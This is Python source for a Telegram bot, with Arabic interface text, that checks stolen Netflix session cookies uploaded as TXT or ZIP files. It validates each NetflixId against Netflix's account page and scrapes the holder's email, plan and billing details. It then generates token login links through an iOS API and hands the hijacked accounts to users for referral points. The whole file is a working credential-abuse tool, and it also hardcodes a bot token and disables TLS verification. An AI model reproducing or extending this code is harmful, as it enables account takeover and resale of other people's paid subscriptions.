import os
import re
import json
import time
import requests
import zipfile
import urllib.parse
import codecs
import logging
import tempfile
import shutil
from datetime import datetime
import uuid
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import random

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Owner credit & Channel info
OWNER_CREDIT = "Faris - https://t.me/faresschannel"
CHANNEL_LINK = "https://t.me/faresschannel"
CHANNEL_USERNAME = "@faresschannel"

# إعدادات بوت التليجرام
BOT_TOKEN = os.environ.get('BOT_TOKEN', '8795234711:AAHQh9fufbVd63QoICaFK8rwdRzHD9V91SI')
bot = telebot.TeleBot(BOT_TOKEN, parse_mode='Markdown')

# 👑 إعدادات المطور الخاصة بك (فارس)
DEVELOPER_ID = 8713916851
DEVELOPER_USERNAME = "farxxes"

STOCK_FILE = "stock_accounts.txt"
USERS_FILE = "users_data.json"
CODES_FILE = "gift_codes.json"

active_scans = {}

def load_data(filepath):
    if not os.path.exists(filepath):
        return {}
    try:
        with open(filepath, "r", encoding="utf-8") as f:
            return json.load(f)
    except:
        return {}

def save_data(filepath, data):
    try:
        with open(filepath, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=4)
    except Exception as e:
        logger.error(f"Error saving data to {filepath}: {e}")

def add_user_if_not_exists(user_id, referrer_id=None):
    users = load_data(USERS_FILE)
    str_id = str(user_id)
    if str_id not in users:
        initial_points = 999999 if int(user_id) == DEVELOPER_ID else 3
        users[str_id] = {
            "points": initial_points, 
            "joined_date": datetime.now().strftime('%Y-%m-%d'),
            "referrals": 0
        }
        
        if referrer_id and str(referrer_id) in users and str(referrer_id) != str_id:
            users[str_id]["points"] += 2
            users[str_id]["referrals"] += 1
            try:
                bot.send_message(referrer_id, "🎉 انضم شخص جديد عبر رابط دعوتك! تم منحك `2` نقطة إضافية.", disable_web_page_preview=True)
            except:
                pass
                
        save_data(USERS_FILE, users)
    else:
        if int(user_id) == DEVELOPER_ID:
            users[str_id]["points"] = 999999
            save_data(USERS_FILE, users)

def save_to_stock(account_text):
    try:
        with open(STOCK_FILE, "a", encoding="utf-8") as f:
            f.write(account_text + "\n" + "="*40 + "\n")
    except Exception as e:
        logger.error(f"Error saving to stock: {e}")

def get_random_account_from_stock():
    if not os.path.exists(STOCK_FILE):
        return None
    try:
        with open(STOCK_FILE, "r", encoding="utf-8") as f:
            content = f.read().strip()
        if not content:
            return None
        
        accounts = content.split("="*40)
        accounts = [acc.strip() for acc in accounts if acc.strip()]
        
        if not accounts:
            return None
            
        chosen_acc = random.choice(accounts)
        remaining_accounts = [acc for acc in accounts if acc != chosen_acc]
        with open(STOCK_FILE, "w", encoding="utf-8") as f:
            f.write(("\n" + "="*40 + "\n").join(remaining_accounts) + ("\n" + "="*40 + "\n" if remaining_accounts else ""))
            
        return chosen_acc
    except Exception as e:
        logger.error(f"Error getting account from stock: {e}")
        return None

def unescape_plan(s):
    try:
        return codecs.decode(s, 'unicode_escape')
    except Exception:
        return s

def format_billing_date(raw):
    try:
        raw = raw.replace('\\x2B', '+').replace('%2B', '+').replace('\\x2b', '+')
        clean = re.sub(r'[+-]\d{2}:?\d{2}$', '', raw.split('.')[0])
        dt = datetime.strptime(clean, '%Y-%m-%dT%H:%M:%S')
        return dt.strftime('%d/%m/%Y')
    except Exception:
        try:
            date_part = raw.split('T')[0]
            y, m, d = date_part.split('-')
            return f"{d}/{m}/{y}"
        except Exception:
            return raw

def extract_netflix_id(content):
    try:
        data = json.loads(content)
        if isinstance(data, list):
            for cookie in data:
                if cookie.get("name") == "NetflixId":
                    return cookie.get("value")
        elif isinstance(data, dict):
            if "NetflixId" in data:
                return data["NetflixId"]
            elif "cookies" in data:
                for cookie in data["cookies"]:
                    if cookie.get("name") == "NetflixId":
                        return cookie.get("value")
    except:
        pass
    
    netflix_id_match = re.search(r'(?<!\w)NetflixId=([^;,\s]+)', content)
    if netflix_id_match:
        netflix_id = netflix_id_match.group(1)
        if '%' in netflix_id:
            try:
                netflix_id = urllib.parse.unquote(netflix_id)
            except:
                pass
        return netflix_id
    
    netscape_match = re.search(r'\.netflix\.com\s+TRUE\s+/\s+TRUE\s+\d+\s+NetflixId\s+([^\s]+)', content)
    if netscape_match:
        netflix_id = netscape_match.group(1)
        if '%' in netflix_id:
            try:
                netflix_id = urllib.parse.unquote(netflix_id)
            except:
                pass
        return netflix_id
    
    plain_match = re.search(r'NetflixId[=:\s]+([^\s;,\n]+)', content, re.IGNORECASE)
    if plain_match:
        netflix_id = plain_match.group(1)
        if '%' in netflix_id:
            try:
                netflix_id = urllib.parse.unquote(netflix_id)
            except:
                pass
        return netflix_id
    
    return None

def extract_next_billing_date(response_text):
    try:
        billing_match = re.search(r'"nextBillingDate":\s*\{[^}]+\}', response_text)
        if billing_match:
            billing_data = billing_match.group(0)
            date_match = re.search(r'"date":\s*"([^"]+)"', billing_data)
            if date_match:
                return date_match.group(1)
        
        date_match = re.search(r'"nextBillingDate"[^}]+"date":\s*"([^"]+)"', response_text)
        if date_match:
            return date_match.group(1)
    except Exception as e:
        logger.error(f"Error extracting billing date: {e}")
    return "Unknown"

def check_netflix_cookie(cookie_dict):
    session = requests.Session()
    session.cookies.update(cookie_dict)
    url = 'https://www.netflix.com/YourAccount'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1'
    }
    try:
        resp = session.get(url, headers=headers, timeout=15)
        txt = resp.text
        if any(phrase in txt.lower() for phrase in ['"mode":"login"']):
            return {'ok': False}
        if '"mode":"yourAccount"' not in txt:
            return {'ok': False}

        def find(pattern, text=txt):
            m = re.search(pattern, text)
            return m.group(1).strip() if m else None

        plan = unescape_plan(find(r'"planName"\s*:\s*"([^"]+)"') or find(r'localizedPlanName[^}]+"value":"([^"]+)"') or "Unknown")
        plan_price = unescape_plan(find(r'"planPrice"[^}]+"value":"([^"]+)"') or "Unknown")
        country = find(r'"countryOfSignup"\s*:\s*"([^"]+)"') or find(r'"countryCode"\s*:\s*"([^"]+)"') or "Unknown"
        email = find(r'"emailAddress"\s*:\s*"([^"]+)"') or "Unknown"
        if email != "Unknown":
            email = urllib.parse.unquote(email)
        next_billing = extract_next_billing_date(txt)

        profiles = re.findall(r'"profileName"\s*:\s*"([^"]+)"', txt)
        profiles_str = ", ".join(list(set(profiles))) if profiles else "Unknown"

        status_match = re.search(r'"membershipStatus":\s*"([^"]+)"', txt)
        is_valid = bool(status_match and status_match.group(1) == 'CURRENT_MEMBER')

        return {
            'ok': is_valid,
            'country': country,
            'plan': plan,
            'plan_price': plan_price,
            'email': email,
            'profiles': profiles_str,
            'next_billing': format_billing_date(next_billing),
            'cookie': cookie_dict
        }
    except Exception as e:
        return {'ok': False}

def generate_token(netflix_id):
    url = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
    params = {
        'appVersion': "15.48.1",
        'config': '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
        'device_type': "NFAPPL-02-",
        'esn': "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
        'idiom': "phone",
        'iosVersion': "15.8.5",
        'isTablet': "false",
        'languages': "en-US",
        'locale': "en-US",
        'maxDeviceWidth': "375",
        'model': "saget",
        'modelType': "IPHONE8-1",
        'odpAware': "true",
        'path': '["account","token","default"]',
        'pathFormat': "graph",
        'pixelDensity': "2.0",
        'progressive': "false",
        'responseFormat': "json"
    }
    headers = {
        'User-Agent': "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
        'Cookie': f"NetflixId={netflix_id}"
    }
    try:
        response = requests.get(url, params=params, headers=headers, timeout=15, verify=False)
        data = response.json()
        if "value" in data and data["value"] and "account" in data["value"]:
            token_data = data["value"]["account"]["token"]["default"]
            token = token_data["token"]
            return {
                "status": "Success",
                "token": token
            }
    except Exception as e:
        logger.error(f"Error in generate_token: {e}")
    return {"status": "Failure"}

def extract_zip_and_get_files(zip_path, extract_dir):
    txt_files = []
    try:
        with zipfile.ZipFile(zip_path, 'r') as zip_ref:
            zip_ref.extractall(extract_dir)
        for root, dirs, files in os.walk(extract_dir):
            for file in files:
                if file.lower().endswith('.txt'):
                    txt_files.append(os.path.join(root, file))
        return txt_files
    except:
        return []

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    args = message.text.split()
    referrer_id = None
    if len(args) > 1 and args[1].startswith('ref'):
        try:
            referrer_id = int(args[1].replace('ref', ''))
        except:
            pass
            
    add_user_if_not_exists(user_id, referrer_id)
    show_main_menu(message.chat.id, user_id, message.message_id if hasattr(message, 'message_id') else None)

def show_main_menu(chat_id, user_id, message_id=None):
    markup = InlineKeyboardMarkup()
    markup.row_width = 1
    markup.add(
        InlineKeyboardButton("📂 فحص ملفات (TXT / ZIP)", callback_data="btn_check"),
        InlineKeyboardButton("🎁 سحب حساب من الذاكرة (نقاط بلا حدود)", callback_data="btn_stock"),
        InlineKeyboardButton("👤 حسابي الشخصي وإحصائياتي", callback_data="btn_profile"),
        InlineKeyboardButton("📢 قناة البوت الرسمية", url=CHANNEL_LINK)
    )
    
    if int(user_id) == DEVELOPER_ID:
        markup.add(InlineKeyboardButton("⚙️ لوحة تحكم المطور (فارس)", callback_data="btn_admin"))
        
    welcome_text = f"🎬 **أهلاً بك في بوت فحص نتفليكس الإحترافي**\n👑 *المطور:* فارس ([@{DEVELOPER_USERNAME}](https://t.me/{DEVELOPER_USERNAME}))\n\nاختر أحد الخيارات أدناه للبدء:"
    
    if message_id:
        try:
            bot.edit_message_text(welcome_text, chat_id, message_id, reply_markup=markup, disable_web_page_preview=True)
            return
        except:
            pass
    bot.send_message(chat_id, welcome_text, reply_markup=markup, disable_web_page_preview=True)

@bot.callback_query_handler(func=lambda call: True)
def handle_callback_query(call):
    user_id = call.from_user.id
    users = load_users()
    str_id = str(user_id)
    
    try:
        bot.answer_callback_query(call.id)
    except:
        pass
    
    data = call.data
    chat_id = call.message.chat.id
    msg_id = call.message.message_id
    
    if data == "check_sub" or data == "btn_home":
        show_main_menu(chat_id, user_id, msg_id)
            
    elif data == "btn_check":
        markup = InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 رجوع للقائمة", callback_data="btn_home"))
        bot.edit_message_text("📂 **أرسل الآن ملف الكوكيز بصيغة `.txt` أو `.zip` وسأبدأ الفحص الفوري!**", chat_id, msg_id, reply_markup=markup, disable_web_page_preview=True)
        
    elif data == "btn_profile":
        points = "♾️ (نقاط بلا حدود للمطور)" if user_id == DEVELOPER_ID else users.get(str_id, {}).get("points", 0)
        joined = users.get(str_id, {}).get("joined_date", "اليوم")
        refs = users.get(str_id, {}).get("referrals", 0)
        bot_info = bot.get_me()
        ref_link = f"https://t.me/{bot_info.username}?start=ref{user_id}"
        
        profile_text = (
            "👤 **الملف الشخصي والإحصائيات**\n\n"
            f"🆔 معرفك: `{user_id}`\n"
            f"💰 رصيدك الحالي: `{points}`\n"
            f"👥 عدد الأشخاص الذين دعوتهم: `{refs}` شخص\n"
            f"📅 تاريخ الانضمام: `{joined}`\n\n"
            f"🔗 **رابط الدعوة الخاص بك:**\n`{ref_link}`\n"
            "*(شارك الرابط مع أصدقائك واربح نقطتين عن كل شخص ينضم!)*"
        )
        markup = InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 رجوع للقائمة", callback_data="btn_home"))
        bot.edit_message_text(profile_text, chat_id, msg_id, reply_markup=markup, disable_web_page_preview=True)
        
    elif data == "btn_stock":
        if user_id != DEVELOPER_ID:
            current_points = users.get(str_id, {}).get("points", 0)
            if current_points < 1:
                markup = InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 رجوع للقائمة", callback_data="btn_home"))
                bot.edit_message_text("❌ رصيدك غير كافٍ! قم بدعوة أصدقائك عبر رابط الدعوة لجمع النقاط.", chat_id, msg_id, reply_markup=markup, disable_web_page_preview=True)
                return
            users[str_id]["points"] -= 1
            save_data(USERS_FILE, users)
        
        account = get_random_account_from_stock()
        if account:
            markup = InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 رجوع للقائمة", callback_data="btn_home"))
            remaining_display = "♾️ (لا ينتهي)" if user_id == DEVELOPER_ID else users[str_id]['points']
            bot.edit_message_text(f"{account}\n\n💰 رصيدك المتبقي: {remaining_display}", chat_id, msg_id, reply_markup=markup, disable_web_page_preview=True)
        else:
            markup = InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 رجوع للقائمة", callback_data="btn_home"))
            bot.edit_message_text("⚠️ عذراً، ذاكرة الحسابات فارغة حالياً. انتظر حتى يتم فحص ملفات جديدة!", chat_id, msg_id, reply_markup=markup, disable_web_page_preview=True)
            
    elif data == "btn_admin":
        if user_id != DEVELOPER_ID:
            return
            
        total_users = len(users)
        stock_count = 0
        if os.path.exists(STOCK_FILE):
            with open(STOCK_FILE, "r", encoding="utf-8") as f:
                stock_count = f.read().count("="*40)
                
        admin_text = (
            f"⚙️ **لوحة تحكم المطور ({DEVELOPER_USERNAME})**\n\n"
            f"👥 إجمالي المستخدمين: `{total_users}`\n"
            f"📦 الحسابات المتاحة في الذاكرة: `{stock_count}` حساب\n"
            f"👑 رصيدك كـ مطور: `نقاط بلا حدود (♾️)`\n\n"
            "▫️ لإضافة نقاط لمستخدم:\n`/addpoints [ID] [العدد]`\n\n"
            "▫️ لإنشاء كود هدية جديد:\n`/createcode [عدد النقاط]`\n\n"
            "▫️ لإذاعة رسالة لجميع المستخدمين:\n`/broadcast [الرسالة]`"
        )
        markup = InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 رجوع للقائمة", callback_data="btn_home"))
        bot.edit_message_text(admin_text, chat_id, msg_id, reply_markup=markup, disable_web_page_preview=True)
        
    elif data.startswith("stop_scan_"):
        scan_id = data.replace("stop_scan_", "")
        if scan_id in active_scans:
            active_scans[scan_id] = True

def load_users():
    return load_data(USERS_FILE)

@bot.message_handler(commands=['addpoints'])
def add_points_command(message):
    if message.from_user.id != DEVELOPER_ID:
        return
    parts = message.text.split()
    if len(parts) != 3:
        bot.reply_to(message, "❌ الاستخدام: `/addpoints [ID] [العدد]`")
        return
    target_id = parts[1]
    try:
        amount = int(parts[2])
    except:
        bot.reply_to(message, "❌ عدد النقاط يجب أن يكون رقماً صحيحاً.")
        return
    users = load_users()
    if target_id in users:
        users[target_id]["points"] += amount
        save_data(USERS_FILE, users)
        bot.reply_to(message, f"✅ تمت إضافة {amount} نقطة بنجاح للمستخدم `{target_id}`.")
    else:
        bot.reply_to(message, "❌ هذا المستخدم غير مسجل في البوت.")

@bot.message_handler(commands=['createcode'])
def create_code_command(message):
    if message.from_user.id != DEVELOPER_ID:
        return
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "❌ الاستخدام: `/createcode [عدد النقاط]`")
        return
    try:
        points = int(parts[1])
    except:
        bot.reply_to(message, "❌ يرجى إدخال رقم صحيح للنقاط.")
        return
        
    code = f"FARIS-{random.randint(1000, 9999)}-{random.randint(100, 999)}"
    codes = load_data(CODES_FILE)
    codes[code] = {"points": points, "used": False}
    save_data(CODES_FILE, codes)
    
    bot.reply_to(message, f"🎁 **تم إنشاء كود الهدية بنجاح!**\n\n🔑 الكود: `{code}`\n💰 القيمة: `{points}` نقطة\n\nأرسله للمستخدمين لشحنه عبر أمر `/redeem [الكود]`")

@bot.message_handler(commands=['redeem'])
def redeem_code_command(message):
    user_id = message.from_user.id
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "❌ الاستخدام الصحيح:\n`/redeem [الكود]`")
        return
    code = parts[1].strip()
    codes = load_data(CODES_FILE)
    
    if code not in codes:
        bot.reply_to(message, "❌ هذا الكود غير صالح أو غير موجود.")
        return
        
    if codes[code]["used"]:
        bot.reply_to(message, "❌ تم استخدام هذا الكود من قبل!")
        return
        
    points = codes[code]["points"]
    codes[code]["used"] = True
    save_data(CODES_FILE, codes)
    
    users = load_users()
    str_id = str(user_id)
    if str_id not in users:
        add_user_if_not_exists(user_id)
        users = load_users()
        
    users[str_id]["points"] += points
    save_data(USERS_FILE, users)
    
    bot.reply_to(message, f"🎉 **مبروك يا غالي!**\nتم شحن الكود بنجاح وإضافة `{points}` نقطة إلى رصيدك.")

@bot.message_handler(commands=['broadcast'])
def broadcast_command(message):
    if message.from_user.id != DEVELOPER_ID:
        return
    text = message.text.replace('/broadcast', '').strip()
    if not text:
        bot.reply_to(message, "❌ اكتب النص المراد إذاعته بعد الأمر.")
        return
        
    users = load_users()
    success = 0
    fail = 0
    
    status_msg = bot.reply_to(message, "📢 جاري إرسال الإذاعة لجميع المستخدمين...")
    for uid in users:
        try:
            bot.send_message(uid, f"📢 **إعلان هام من المطور:**\n\n{text}", disable_web_page_preview=True)
            success += 1
            time.sleep(0.02)
        except:
            fail += 1
            
    bot.edit_message_text(f"✅ **تمت الإذاعة بنجاح!**\n- الإرسال الناجح: `{success}`\n- الفاشل: `{fail}`", message.chat.id, status_msg.message_id)

@bot.message_handler(content_types=['document'])
def handle_documents(message):
    user_id = message.from_user.id
    add_user_if_not_exists(user_id)
    
    temp_dirs = []
    scan_id = str(uuid.uuid4())
    active_scans[scan_id] = False
    
    try:
        stop_markup = InlineKeyboardMarkup()
        stop_markup.add(InlineKeyboardButton("⏹️ إيقاف الفحص", callback_data=f"stop_scan_{scan_id}"))
        
        status_msg = bot.send_message(message.chat.id, "⏳ **جاري تحضير الملف وبدء الفحص الإحترافي...**\n📊 التقدم: `0%`", reply_markup=stop_markup)
        
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        filename = message.document.file_name
        unique_dir = tempfile.mkdtemp(prefix=f"netflix_bot_{uuid.uuid4().hex}_")
        temp_dirs.append(unique_dir)
        
        file_path = os.path.join(unique_dir, filename)
        with open(file_path, 'wb') as new_file:
            new_file.write(downloaded_file)
            
        txt_files_to_check = []
        if filename.lower().endswith('.zip'):
            txt_files_to_check = extract_zip_and_get_files(file_path, unique_dir)
        elif filename.lower().endswith('.txt'):
            txt_files_to_check = [file_path]
            
        if not txt_files_to_check:
            bot.edit_message_text("❌ لم يتم العثور على ملفات نصية صالحة.", message.chat.id, status_msg.message_id)
            return
            
        all_lines = []
        for txt_file in txt_files_to_check:
            try:
                with open(txt_file, 'r', encoding='utf-8', errors='ignore') as f:
                    all_lines.extend(f.readlines())
            except:
                pass
                
        total_lines = len(all_lines)
        if total_lines == 0:
            bot.edit_message_text("❌ الملف فارغ تماماً.", message.chat.id, status_msg.message_id)
            return

        valid_count = 0
        processed_count = 0
        result_file_path = os.path.join(unique_dir, "the_premuim_account.txt")
        
        with open(result_file_path, "w", encoding="utf-8") as res_file:
            for line in all_lines:
                if active_scans.get(scan_id, False):
                    bot.edit_message_text("⏹️ **تم إيقاف عملية الفحص بنجاح بناءً على طلبك.**", message.chat.id, status_msg.message_id)
                    break
                    
                processed_count += 1
                line = line.strip()
                if not line:
                    continue
                    
                if processed_count % 5 == 0 or processed_count == total_lines:
                    percent = int((processed_count / total_lines) * 100)
                    try:
                        bot.edit_message_text(
                            f"🔍 **جاري فحص الحسابات الآن...**\n📊 النسبة المئوية: `{percent}%` ({processed_count}/{total_lines})\n✅ الحسابات الفعالة: `{valid_count}`",
                            message.chat.id, status_msg.message_id, reply_markup=stop_markup
                        )
                    except:
                        pass
                        
                netflix_id = extract_netflix_id(line)
                if not netflix_id:
                    continue
                    
                account_info = check_netflix_cookie({"NetflixId": netflix_id})
                
                if account_info["ok"] and account_info.get('plan') != "Unknown" and account_info.get('next_billing') != "Unknown":
                    valid_count += 1
                    token_result = generate_token(netflix_id)
                    
                    # 🎯 التنسيق المطلوب والمضبوط بدقة تامة
                    final_token = token_result.get('token') if token_result.get('status') == 'Success' else netflix_id
                    login_url = f"https://netflix.com/unsupported?nftoken={final_token}"
                    
                    res_msg = "🎬 حساب NETFLIX صالح وفعال 🎬\n\n"
                    res_msg += f"🌍 البلد: {account_info['country']}\n"
                    res_msg += f"📦 الباقة: {account_info['plan']}\n"
                    res_msg += f"💰 السعر: {account_info['plan_price']}\n"
                    res_msg += f"📅 التجديد: {account_info['next_billing']}\n"
                    res_msg += f"👥 الملفات: {account_info['profiles']}\n"
                    res_msg += f"📧 البريد: {account_info['email'].replace(chr(92) + 'x40', '@')}\n\n"
                    res_msg += f"📱 رابط الدخول المباشر:\n{login_url}"
                    
                    markup = InlineKeyboardMarkup()
                    markup.add(
                        InlineKeyboardButton("💻 PC Login", url=login_url),
                        InlineKeyboardButton("📱 Phone Login", url=login_url)
                    )
                    
                    bot.send_message(message.chat.id, res_msg, reply_markup=markup, disable_web_page_preview=True)
                    
                    res_file.write(res_msg + "\n" + "="*40 + "\n")
                    save_to_stock(res_msg)
                    time.sleep(0.1)
                    
        try:
            bot.delete_message(message.chat.id, status_msg.message_id)
        except:
            pass
            
        if valid_count > 0 and os.path.exists(result_file_path):
            with open(result_file_path, "rb") as rf:
                bot.send_document(message.chat.id, rf, caption=f"📁 **ملف النتائج الشامل:** `the_premuim_account.txt`\n👑 *By Faris* (@{DEVELOPER_USERNAME})")
                
        bot.send_message(message.chat.id, f"✅ **انتهى الفحص بنجاح!**\n📊 إجمالي الحسابات الفعالة المكتشفة: `{valid_count}` حساب.\n👑 *Channel:* {CHANNEL_LINK}", disable_web_page_preview=True)
        
    except Exception as e:
        bot.reply_to(message, f"❌ حدث خطأ أثناء المعالجة: {str(e)}")
    finally:
        if scan_id in active_scans:
            del active_scans[scan_id]
        for temp_dir in temp_dirs:
            try:
                shutil.rmtree(temp_dir)
            except:
                pass

if __name__ == '__main__':
    logger.info("Telegram Bot is running with exact custom Netflix result format...")
    bot.infinity_polling(skip_pending=True)
